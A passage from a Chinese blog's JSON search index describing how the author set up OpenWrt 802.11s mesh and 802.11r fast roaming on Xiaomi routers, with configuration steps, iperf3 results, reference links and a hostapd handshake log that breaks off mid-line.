roaming)\u534f\u8bae\uff0c\u51c6\u786e\u6765\u8bf4\u53eb\u505a802.11r\u534f\u8bae\uff0c\u53ef\u4ee5\u51cf\u5c11\u8bbe\u5907\u5207\u6362\u65e0\u7ebf\u7f51\u7edc\u7684\u8017\u65f6\u3002</p> <p>\u786c\u4ef6\u8bbe\u5907\u4e0a\uff0c\u6211\u9009\u62e9\u4f7f\u7528\u5c0f\u7c73\u8def\u75313G\u6765\u642d\u5efa\uff0c\u4e3b\u8981\u662f\u56e0\u4e3a\u786c\u4ef6\u914d\u7f6e\u4e0a\u5728wifi5\u7684\u8def\u7531\u5668\u4e2d\u7b97\u662f\u5f88\u4e0d\u9519\u7684\u4e86\uff0c\u4e14\u67d0\u9c7c\u4e0a\u4e00\u4e2a\u53ea\u9700\u898150\u5143\u3002\u4e8e\u662f\u53c8\u4e70\u4e86\u4e24\u4e2a\uff0c\u52a0\u4e0a\u539f\u672c\u7684\uff0c\u73b0\u5728\u67094\u53f0openwrt\u8def\u7531\u5668\uff0c\u4e00\u4e2a\u7ea2\u7c73AC2100\u4f5c\u4e3a\u4e3b\u8def\u7531\uff0c3\u4e2aR3G\u4f5c\u4e3aAP\u8282\u70b9\u3002</p> <p>\u4e3a\u4e86\u65b9\u4fbf\u914d\u7f6e\u8fd8\u5b9e\u73b0\u4e86\u4e00\u4e2a\u81ea\u52a8\u914d\u7f6e\u811a\u672c\u653e\u5728github\uff1aTheRainstorm/my-openwrt-config (github.com)</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u540d\u8bcd","title":"\u540d\u8bcd","text":"<ul> <li>Wireless Access Point   \u65e0\u7ebf\u63a5\u5165\u70b9\uff0c\u901a\u5e38\u7b80\u79f0\u4e3aAP\u3002AP\u5176\u5b9e\u9690\u542bdumb\u7684\u542b\u4e49\u3002\u8def\u7531\u5668\u8bbe\u7f6e\u91cc\u4e00\u822c\u4f1a\u6709\uff1a\u8def\u7531\u5668\u6a21\u5f0f\u3001AP\u6a21\u5f0f\u7b49\u9009\u9879\u3002AP\u6a21\u5f0f\u4e0b\uff0c\u8def\u7531\u5668\u4e0d\u63d0\u4f9b\u8def\u7531\u3001DHCP\u3001DNS\u7b49\u529f\u80fd\uff0c\u800c\u662f\u901a\u8fc7\u4e3b\u8def\u7531\u6765\u63d0\u4f9b\u3002</li> <li>AP\u901a\u5e38\u7684\u4f5c\u7528\u662f\u4e3a\u73b0\u6709\u7684\u7f51\u7edc\u63d0\u4f9b\u989d\u5916\u7684\u65e0\u7ebf\u8986\u76d6\uff0c\u6bd4\u5982\u4e3b\u8def\u7531\u5668\u5728\u4e8c\u697c\uff0c\u901a\u8fc7AP\u5c06\u7f51\u7edc\u8986\u76d6\u5230\u4e00\u697c\u3002</li> <li>\u5b9e\u73b0\u4e0a\uff0cAP\u5c06\u65e0\u7ebf\u63a5\u53e3\u548cLAN\u63a5\u53e3\u6865\u63a5\u5728\u4e00\u8d77\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u4e8c\u7ea7\u4ea4\u6362\u673a\u3002</li> <li>SSID\u3001BSSID   SSID\u662f\u65e0\u7ebf\u7f51\u7edc\u7684\u540d\u79f0\uff0c\u4e0d\u540c\u7684AP\u53ef\u4ee5\u63d0\u4f9b\u76f8\u540c\u7684SSID\u3002BSSID\u662f\u65e0\u7ebf\u7f51\u7edc\u7684MAC\u5730\u5740\uff0c\u662f\u552f\u4e00\u7684\u3002</li> </ul> <p>802.11k:\u65e0\u7ebf\u5c40\u57df\u7f51\u9891\u8c31\u8d44\u6e90\u6d4b\u91cf\u534f\u8bae\uff0c\u7531AP\u626b\u63cf\u5468\u56f4\u90bb\u5c45AP\u4fe1\u606f\uff0c\u914d\u5408\u7ec8\u7aef\u626b\u63cf\u6f5c\u5728\u6f2b\u6e38\u76ee\u6807\u4fe1\u606f\uff0c\u89e3\u51b3\u4f55\u65f6\u6f2b\u6e38\u95ee\u9898\u3002 802.11v:\u65e0\u7ebf\u7f51\u7edc\u7ba1\u7406\u534f\u8bae\uff0c\u7ec8\u7aef\u8bf7\u6c42\u6f2b\u6e38\u76ee\u6807\uff08\u975e\u5fc5\u8981\uff09\uff0cAP\u5efa\u8bae\u7ec8\u7aef\u6f2b\u6e38\u76ee\u6807\uff0c\u89e3\u51b3\u6f2b\u6e38\u5230\u4f55\u5904\u95ee\u9898\u3002 802.11r:\u5feb\u901fBSS\u8f6c\u6362\u534f\u8bae\uff0c\u6d88\u9664\u65e0\u7ebf\u91cd\u5173\u8054\u8fc7\u7a0b\u4e2d\u7684\u63e1\u624b\u5f00\u9500\uff0c\u6781\u5927\u51cf\u5c11\u6f2b\u6e38\u65f6\u95f4\uff0c\u89e3\u51b3\u5982\u4f55\u5173\u91cd\u5173\u8054\u95ee\u9898\u3002</p> <p>\u4e00\u3001\u8981\u6709\u81ea\u52a8\u5207\u6362Wi-Fi \u4fe1\u53f7\u7684\u6548\u679c\uff0c\u53ea\u9700\u8981\u652f\u630180.11k\u548c802.11v\uff0c\u7136\u540e\u6539\u76f8\u540c\u7684Wi-Fi \u540d\u79f0\u548c\u5bc6\u7801\u5373\u53ef\uff0c\u53ea\u8981\u7ec8\u7aef\u4e5f\u652f\u6301k\u548cv\u4e3b\u4f1a\u4e3b\u5207\u6362\uff0c\u800c802.11r\u4e0d\u662f\u5fc5\u9700\u7684\u3002  </p> <p>\u4e8c\u3001MESH\u7ec4\u7f51\u4e0e\u81ea\u52a8\u5207\u6362\u662f\u4e24\u56de\u4e8b\uff0c\u6ca1\u6709\u76f4\u63a5\u5173\u7cfb\u3002MESH\u662f\u4e00\u79cd\u7ec4\u7f51\u65b9\u5f0f\uff0c\u800c\u7edd\u5927\u591a\u6570MESH\u7ec4\u7f51\u540e\u5c31\u4f1a\u652f\u6301k\u548cv\uff0c\u81f3\u5c11\u5728\u5f53\u4eca\u7684Wi-Fi 6\u65f6\u4ee3\u662f\u8fd9\u6837\u3002 \u4e09\u3001\u65e0\u7f1d\u6f2b\u6e38\uff0c\u662f\u6307\u81ea\u52a8\u5207\u6362\u7684\u65f6\u95f4\u505a\u5230\u5c3d\u91cf\u7684\u77ed\uff0c\u4ece\u800c\u8fbe\u5230\u5207\u6362\u8fc7\u7a0b\u4e0d\u4f1a\u51fa\u73b0\u65ad\u7ebf\u73b0\u8c61\uff0c\u600e\u4e48\u505a\u5230\u6700\u77ed\u5462\uff1f\u8fd9\u8ddf\u201c\u6f2b\u6e38\u9600\u503c\u201d\u3001\u201c\u5f3a\u4fe1\u53f7\u91cd\u53e0\u8303\u56f4\u201d\u6709\u5173\uff0c\u800c\u7edd\u5927\u591a\u6570\u65e0\u7ebf\u8def\u7531\u5668\u4e00\u822c\u6ca1\u6709\u6f2b\u6e38\u9600\u503c\u53ef\u8bbe\u7f6e\uff0c\u90a3\u6700\u7b80\u5355\u53ef\u63a7\u7684\u5c31\u662f\u5f3a\u4fe1\u53f7\u91cd\u53e0\u8303\u56f4\u4e86\uff0c\u901a\u8fc7\u6446\u653e\u4f4d\u7f6e\u6216\u964d\u4f4e\u4fe1\u53f7\u5f3a\u5ea6\u5373\u53ef\u3002\u5982\u6709\u5f31\u4fe1\u53f7\u5254\u9664\u529f\u80fd\u5c31\u66f4\u6709\u53ef\u63a7\u6027</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u65e0\u7ebf\u6f2b\u6e38\u7684\u8fc7\u7a0b","title":"\u65e0\u7ebf\u6f2b\u6e38\u7684\u8fc7\u7a0b","text":"<p>\u9700\u8981\u660e\u767d\u4e24\u4ef6\u4e8b - \u7b2c\u4e00\uff0c\u8bbe\u5907\u503e\u5411\u4e8e\u8d56\u5728\u540c\u4e00\u4e2a\u7f51\u7edc\u4e0a\u3002\u5f53WIFI\u7684\u4fe1\u53f7\u5f3a\u5ea6\u5f31\u4e8e-70dB\uff0c\u4e14\u65b0WIFI\u7684\u4fe1\u53f7\u5f3a\u5ea6\u6bd4\u539f\u4fe1\u53f7\u9ad88-12dB\u65f6\u624d\u4f1a\u9009\u62e9\u5207\u6362\u7f51\u7edc\u3002 - \u7b2c\u4e8c\uff0c\u8fde\u63a5\u4e00\u4e2a\u7f51\u7edc\u9700\u8981\u7ecf\u8fc7\u4e00\u4e9b\u8017\u65f6\u8fc7\u7a0b\u3002   1. \u9700\u8981\u8fdb\u884c\u5bc6\u94a5\u4ea4\u6362\u3001\u534f\u5546\u52a0\u5bc6\u7b97\u6cd5   2. \u8bbe\u5907\u9700\u8981\u83b7\u5f97\u4e00\u4e2aIP\u5730\u5740\uff08\u901a\u5e38\u901a\u8fc7DHCP\u534f\u8bae\uff09</p> <p>\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u7406\u8bba\u4e0a\u8def\u7531\u5668\u53ef\u4ee5\u7ed9\u8bbe\u5907\u53d1\u9001\u4fe1\u53f7\u4f7f\u5176\u9009\u62e9\u5207\u6362\u65e0\u7ebf\u7f51\u7edc\uff0c\u4e0d\u8fc7\u4e0d\u77e5\u9053\u76ee\u524d\u6709\u6ca1\u6709\u8fd9\u4e48\u505a\u3002 \u7b2c\u4e8c\u4e2a\u95ee\u9898 - \u5bf9\u4e8e\u5bc6\u94a5\u4ea4\u6362\u548c\u534f\u5546\u7684\u8fc7\u7a0b\u5f88\u660e\u663e\u662f\u53ef\u4ee5\u907f\u514d\u7684\uff0c802.11s\u534f\u8bae\u5e94\u8be5\u5c31\u662f\u8282\u7ea6\u4e86\u8fd9\u90e8\u5206\u7684\u65f6\u95f4\u3002\u53ea\u8981\u914d\u7f6e\u6210\u540c\u4e00\u4e2a\u57df\uff0c\u90a3\u4e48\u5728\u4e0d\u540cBSSID\u95f4\u5207\u6362\u5c31\u53ef\u4ee5\u5229\u7528\u539f\u6709\u7684\u8fde\u63a5\u3002 - \u800c\u5bf9\u4e8e\u83b7\u5f97IP\uff0c\u53ea\u8981\u8def\u7531\u5668\u662fAP\u6a21\u5f0f\uff0c\u90a3\u4e48\u4fbf\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u539f\u672c\u7684IP\u5730\u5740\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u4f7f\u7528\u539f\u672c\u7684IP\u5730\u5740\u3002</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#80211s\u662f\u5426\u9700\u8981\u786c\u4ef6\u652f\u6301","title":"802.11s\u662f\u5426\u9700\u8981\u786c\u4ef6\u652f\u6301","text":"<p>\u7406\u8bba\u4e0a\u4e0d\u9700\u8981\uff0c\u4f46\u662f\u6709\u4e9b\u786c\u4ef6\u7684wifi\u9a71\u52a8\u53ef\u80fd\u4f1a\u6709\u95ee\u9898\uff08\u5f00\u6e90\u9a71\u52a8\u57fa\u672c\u4e0d\u4f1a\u6709\u95ee\u9898\uff09 \u53ef\u4ee5\u901a\u8fc7iw\u67e5\u770b\u9a71\u52a8\u662f\u5426\u6709mesh\u9009\u9879\u3002 <pre><code>iw list | grep \"Supported interface modes\" -A 9\n</code></pre></p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"<p>\u53ef\u4ee5\u8be6\u7ec6\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\uff1aOpenWrt 802.11s mesh | My wiki (bmaupin.github.io) \u81ea\u5df1\u5199\u4e86\u4e00\u4e2a\u81ea\u52a8\u914d\u7f6e\u811a\u672c\uff1aTheRainstorm/my-openwrt-config (github.com)</p> <p>\u4e3b\u8def\u7531\u53ea\u9700\u8981\u8bbe\u7f6e802.11r\u5feb\u901f\u6f2b\u6e38\u5373\u53ef\uff0c\u800cAP\u5219\u9700\u8981\u8bbe\u7f6emesh(802.11s)\uff0c\u5e76\u5728\u63d0\u4f9bwifi\u7684\u7f51\u7edc\u4e0a\u8bbe\u7f6e802.11r</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u5b89\u88c5wpad","title":"\u5b89\u88c5wpad","text":"<p>openwrt wifi\u529f\u80fd\u7531wpad\u5305\u63d0\u4f9b\u3002openwrt\u63d0\u4f9b\u4e86\u591a\u79cdwpad\u5305\uff0c\u9488\u5bf9\u4e0d\u540c\u529f\u80fd\u8fdb\u884c\u4e86\u526a\u88c1\uff0c\u5927\u5c0f\u4e0d\u540c\u3002\u4e0d\u540c\u5305\u4f1a\u51b2\u7a81\uff0c\u53ea\u80fd\u4f7f\u7528\u4e00\u4e2a\u3002\u4f7f\u7528wpad-mesh-openssl\u5373\u53ef\u3002 - wpad\uff1a\u6700\u5b8c\u6574 - wpad-openssl - wpad-mesh-openssl - wpad-basic-openssl\uff1a\u7cbe\u7b80</p> <p>Install either\u00a0<code>wpad-mesh-openssl</code>\u00a0(for devices with a lot of storage/memory) or\u00a0<code>wpad-mesh-wolfssl</code>\u00a0(for devices with low storage/memory)</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#dummy-ap\u914d\u7f6e","title":"dummy AP\u914d\u7f6e","text":"<p>\u5b98\u65b9\u6587\u6863\uff1a[OpenWrt Wiki] Wireless Access Point / Dumb Access Point</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u5173\u95eddhcp\u670d\u52a1\u5668","title":"\u5173\u95edDHCP\u670d\u52a1\u5668","text":"<p>ipv4\u52fe\u9009ignore interface\u5373\u53ef</p> <p></p> <p>ipv6\u9700\u8981\u5c06ra, dhcpv6, ndp\u5747\u8bbe\u7f6e\u4e3adisabled</p> <p></p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#lan\u63a5\u53e3ip\u5730\u5740","title":"LAN\u63a5\u53e3ip\u5730\u5740","text":"<p>LAN\u63a5\u53e3\u9700\u8981\u8bbe\u7f6eip\u5730\u5740\uff0c\u6709\u4e24\u79cd\u65b9\u5f0f\uff08\u63a8\u8350\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff09 - \u8bbe\u7f6e\u9759\u6001\u5730\u5740\uff0c\u9700\u8981\u540c\u65f6\u8bbe\u7f6e\u7f51\u5173\u3001DNS\u4e3a\u4e3b\u8def\u7531</p> <p></p> <p></p> <ul> <li>\u66f4\u7b80\u5355\u7684\u65b9\u5f0f\u4e3a\u5c06LAN\u8bbe\u7f6e\u4e3adhcp\u5ba2\u6237\u7aef\u3002\u8fd9\u6837\u597d\u5904\u662f\u4e0d\u7528\u914d\u7f6e\uff0c\u91cd\u542f\u540e\u8def\u7531\u5668\u52a0\u5165mesh\u540e\u4fbf\u53ef\u4ee5\u6210\u529f\u4e0a\u7f51\u3002\u5728\u4e4b\u540e\u53ef\u4ee5\u5728\u4e3b\u8def\u7531DHCP\u8bbe\u7f6e\u4e2d\u5206\u914d\u9759\u6001\u5730\u5740\uff0c\u8fd9\u6837\u8def\u7531\u5668\u4e0b\u6b21\u91cd\u542f\u4fbf\u4f1a\u83b7\u5f97\u6307\u5b9aip\u5730\u5740\u4e86\u3002</li> </ul> <p></p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u5173\u95ed\u9632\u706b\u5899-dns\u7b49\u670d\u52a1","title":"\u5173\u95ed\u9632\u706b\u5899, dns\u7b49\u670d\u52a1","text":"<p>system-&gt;starup\u4e2d\u5173\u95ed\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u670d\u52a1\uff0c\u5982firewall, dnsmasq, odhcpd</p> <p></p> <p>\u4e3b\u8981\u90e8\u5206\u5df2\u7ecf\u914d\u7f6e\u5b8c\u6210\u3002\u63a5\u4e0b\u6765\u662f\u4e00\u4e9b\u53ef\u9009\u64cd\u4f5c</p> <ul> <li>\u5220\u9664\u6389WAN, WAN6\u7b49\u5176\u4f59\u63a5\u53e3</li> <li>\u5220\u9664\u6389\u6240\u6709\u9632\u706b\u5899zone</li> </ul>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#mesh\u914d\u7f6e80211s","title":"mesh\u914d\u7f6e(802.11s)","text":"<p>mesh\u9700\u8981\u5360\u6389\u4e00\u4e2a\u65e0\u7ebf\u9891\u6bb5\uff0c\u8fd9\u91cc\u6211\u9009\u62e9\u4f7f\u75282.4GHz\u3002\u56e0\u4e3a\u5bb6\u91cc\u7684\u5bbd\u5e26\u662f100MHz\uff0c\u56e0\u6b642.4GHz\u7684144Mbps\u5e26\u5bbd\u8db3\u591f\uff0c\u7136\u540e\u5c31\u662f2.4GHz\u7684\u7a7f\u5899\u6027\u80fd\u8981\u597d\u5f97\u591a\u3002 - \u9009\u62e9\u4e00\u4e2aradio\u65b0\u5efa\u4e00\u4e2a\u7f51\u7edc\uff0c\u6bd4\u59822.4GHz radio</p> <p></p> <ul> <li>\u8bbe\u7f6eWIFI\u4fe1\u9053\uff0c\u6240\u6709mesh\u8282\u70b9\u9700\u8981\u4f7f\u7528\u76f8\u540c\u4fe1\u9053</li> </ul> <p></p> <ul> <li>\u7136\u540e\u7136\u540e\u9009\u62e9mesh point\u6a21\u5f0f\u3002mesh id\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4fdd\u8bc1mesh\u8282\u70b9\u4e00\u81f4\u5373\u53ef\u3002\u52a0\u5bc6\u5fc5\u987b\u9009\u62e9wpa3-SAE\u52a0\u5bc6\u3002</li> </ul> <p></p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u65e0\u7ebf80211r\u914d\u7f6e","title":"\u65e0\u7ebf802.11r\u914d\u7f6e","text":"<p>\u53e6\u4e00\u4e2aradio\u7528\u4e8e\u63d0\u4f9b\u4e0a\u7f51\uff0c\u53ef\u4ee5\u65b0\u5efa\u4e00\u4e2a\u63a5\u53e3\u9009\u62e9AP\u6a21\u5f0f\uff08\u9ed8\u8ba4\u5df2\u7ecf\u5b58\u5728\uff09</p> <p></p> <p>\u4e3a\u4e86\u5b9e\u73b0\u5feb\u901f\u6f2b\u6e38\u9700\u8981\u8bbe\u7f6e802.11r\uff0c\u4e3b\u8981\u9700\u8981\u8bbe\u7f6eMobility Domain\uff0c\u4fdd\u8bc1\u6240\u6709\u8282\u70b9\u76f8\u540c</p> <p></p> <p>FT\u534f\u8bae\u7684\u533a\u522b\uff0c\u4e2a\u4eba\u611f\u89c9\u4e0d\u592a\u660e\u663e\u3002</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u6548\u679c","title":"\u6548\u679c","text":"<p>\u4e8c\u697c\u662f\u4e00\u53f0RM2100\u4f5c\u4e3a\u4e3b\u8def\u7531\uff0c\u63d0\u4f9b2.4GHz\u548c5GHz WIFI\u30025GHz\u4f7f\u752852\u4fe1\u9053\u3002</p> <p>\u4e00\u697c\u67093\u53f0R3G\uff0c\u901a\u8fc7mesh\u65e0\u7ebf\u76f8\u4e92\u8fde\u63a5\u3002\u5176\u4e2d\u4e00\u53f0\u901a\u8fc7\u7f51\u7ebf\u8fde\u63a5\u5230\u4e8c\u697cRM2100\u30023\u53f0R3G\u542f\u75285GHz WIFI\u540d\u5b57\u76f8\u540c\uff0c\u5206\u522b\u5360\u752836\u4fe1\u9053\uff0c52\u4fe1\u9053\uff0c100\u4fe1\u9053\u3002\u4e0d\u540c\u4fe1\u9053\u95f4\u521a\u597d\u76f8\u5dee80MHz\u7b49\u4e8eWIFI5\u7684\u9891\u5bbd\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f8\u4e92\u4e0d\u5e72\u6270\u3002</p> <p>\u4e0b\u56fe\u5206\u522b\u662f\u4e8c\u697c\u4e3b\u8def\u7531\u548c\u4e00\u697c\u4e00\u53f0\u8def\u7531\u7684\u4fe1\u9053\u5206\u6790\u56fe</p> <p></p> <p></p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u7ed3\u679c","title":"\u7ed3\u679c","text":"<p>\u5728\u4e3b\u8def\u7531\u4e0a\u5f00\u542fiperf3\u670d\u52a1\uff0c\u624b\u673a\u4e0a\u5b89\u88c5iperf3\u5ba2\u6237\u7aef\u6d4b\u901f\uff0c\u5e76\u5728\u4e00\u697c\u548c\u4e8c\u697c\u8d70\u52a8\u3002\u7ecf\u9a8c\u8bc1\u786e\u5b9e\u53ef\u4ee5\u81ea\u52a8\u5b9e\u73b0\u7f51\u7edc\u6f2b\u6e38\uff0c\u8d70\u5230\u67d0\u4e9b\u4f4d\u7f6e\u65f6\u7f51\u901f\u5728\u964d\u901f\u540e\u9a6c\u4e0a\u53ef\u4ee5\u6062\u590d\u3002</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u4f8b\u5b50","title":"\u4f8b\u5b50","text":"<p>rm2100:  - 2.4G mesh + 2.4 Wifi (disabled) - 5G wifi r3g x 3 - 2.4G mesh - 5G wifi</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li>\u8bbe\u7f6eAP\u548c\u5feb\u901f\u6f2b\u6e38\uff1aCHEAP WI-FI MESH ALTERNATIVE with fast roaming OpenWrt Wi-Fi Access points - YouTube</li> <li>batman\uff0c\u66f4\u590d\u6742\u4e5f\u529f\u80fd\u66f4\u591a\u7684mesh\u534f\u8bae: DIY MESH WiFi with batman-adv and OpenWrt - YouTube</li> <li>802.11k, v, r\u7684\u4ecb\u7ecd\uff1aFast Roaming with 802.11k, 802.11v, and 802.11r - Windows drivers | Microsoft Docs</li> <li>FT over DS\u8fd8\u662fFT over AirWhen does 802.11r \"FT over DS\" make sense to use? - Installing and Using OpenWrt / Network and Wireless Configuration - OpenWrt Forum</li> <li>802.11r Fast Roaming configuration (channels and FT) - Installing and Using OpenWrt - OpenWrt Forum<ul> <li>Over-the-Air\u2014The client communicates directly with the target AP using IEEE 802.11 authentication with the FT authentication algorithm. </li> <li>Over-the-DS\u2014The client communicates with the target AP through the current AP.</li> </ul> </li> </ul> <pre><code>daemon.debug hostapd: wlan0: STA e0:...:30 WPA: FT authentication already completed - do not start 4-way handshake\n</code></pre>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u7406\u8bba","title":"\u7406\u8bba","text":"<p>CCIE Wireless: 802.11r (wirelessccie.blogspot.com)</p> <ul> <li>The reassociation timeout determines the duration for which the newly negotiated key is valid. By default, if the client does not make the jump within 20 seconds, the next AP cancels the PMK-R1, considering that the client went elsewhere.</li> </ul> <p>\u65e0\u7ebf\u6293\u5305\u5f88\u96be\u529e\u5230 - \u9700\u8981\u4e13\u95e8\u7684\u7f51\u5361\u548c\u9a71\u52a8 - \u5728Windows\u7535\u8111\u4e0a\u901a\u8fc7wireshark\u76f4\u63a5\u65e0\u7ebf\u6293\u5305\u7684\u65b9\u5f0f - \u77e5\u4e86\u793e\u533a (h3c.com)</p>","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u6d4b\u8bd5","title":"\u6d4b\u8bd5","text":"<p>\u6b63\u5e38\u65e0\u7ebf\u8fde\u63a5op3 <pre><code>Thu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authentication OK (open system)\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 0 notification\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-AUTHENTICATE.indication(2a:85:8f:ff:be:e3, OPEN_SYSTEM)\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\nThu Aug 17 22:58:44 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: authenticated\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: association OK (aid 7)\nThu Aug 17 22:58:44 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: associated (aid 7)\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-ASSOCIATE.indication(2a:85:8f:ff:be:e3)\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 MLME: MLME-DELETEKEYS.request(2a:85:8f:ff:be:e3)\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.11: binding station to interface 'wlan1'\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: event 1 notification\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: start authentication\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.1X: unauthorizing port\nThu Aug 17 22:58:44 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 1/4 msg of 4-Way Handshake\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: EAPOL-Key timeout\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 1/4 msg of 4-Way Handshake\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: received EAPOL-Key frame (2/4 Pairwise)\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: sending 3/4 msg of 4-Way Handshake\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: received EAPOL-Key frame (4/4 Pairwise)\nThu Aug 17 22:58:45 2023 daemon.notice hostapd: wlan1: AP-STA-CONNECTED 2a:85:8f:ff:be:e3\nThu Aug 17 22:58:45 2023 daemon.debug hostapd: wlan1: STA 2a:85:8f:ff:be:e3 IEEE 802.1X: authorizing port\nThu Aug 17 22:58:45 2023 daemon.info hostapd: wlan1: STA 2a:85:8f:ff:be:e3 WPA: pairwise key handshake completed (RSN)\nThu Aug 17 22:58:45 2023 daemon.notice hostapd: wlan1: EAPOL-4WAY-HS-COMPLETED 2a:85:8f:ff:be:e3\nThu Aug 17 22:58:45 2023 daemon.info dnsmasq-dhcp[1]: DHCPREQUEST(br-lan) 192.168.33.218 2a:85:8f:ff:be:e3\nThu Aug 17 22:58:45 2023 daemon.info dnsmasq-dhcp[1]: DHCPACK(br-lan) 192.168.33.218 